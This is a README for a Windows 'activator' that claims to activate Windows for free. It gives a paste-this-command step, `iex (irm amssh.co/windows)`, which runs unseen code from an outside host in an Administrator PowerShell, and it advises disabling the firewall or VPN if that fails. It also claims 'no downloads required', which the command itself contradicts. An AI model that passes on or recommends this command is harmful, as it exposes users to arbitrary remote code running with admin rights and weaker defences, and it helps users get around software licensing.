# AMS Windows Activator

**AMS (Activation Management Service)** is a utility script designed to simplify the activation process of Windows operating systems using built-in system tools. It is intended strictly for educational and administrative testing purposes in controlled environments.

> ⚠️ **Terms of Use**  
> This project is provided for **educational purposes only**. The authors and maintainers are **not responsible** for any misuse or violation of software licensing agreements. By using this script, you agree to comply with the license terms of your installed Windows version and understand the legal implications of software activation.

---

## ✅ Key Features

- One-liner activation via PowerShell
- Supports most versions of Windows
- Fully script-based, no downloads required
- Clean and minimal implementation
- Hosted via secure HTTPS

---

## 🚀 How to Use

> Make sure you are running PowerShell with **Administrator rights**.

1. Press `Win` → search for `PowerShell`
2. Right-click on **Windows PowerShell** and choose **Run as administrator**
3. Paste and run the following command:

<div style="margin-top:10px">
  <strong>📋 Copy Command:</strong>
</div>


```shell
iex (irm amssh.co/windows)
```

> This will fetch and run the latest AMS activation script directly in PowerShell.

---

## ℹ️ Notes

- Internet connection is required for the script to function.
- AMS does **not** install any third-party software or make permanent system modifications.
- Use responsibly in accordance with your organization’s IT policies.

---

## 🛠️ Troubleshooting

If activation fails:

- Make sure PowerShell is running as **Administrator**
- Check your internet connection
- Temporarily disable VPN or firewall if blocking outbound requests
- Reboot and try again

---

## 📜 License

This repository and associated scripts are released under the [MIT License](LICENSE).

---

For more information or to contribute, please open an issue or pull request.
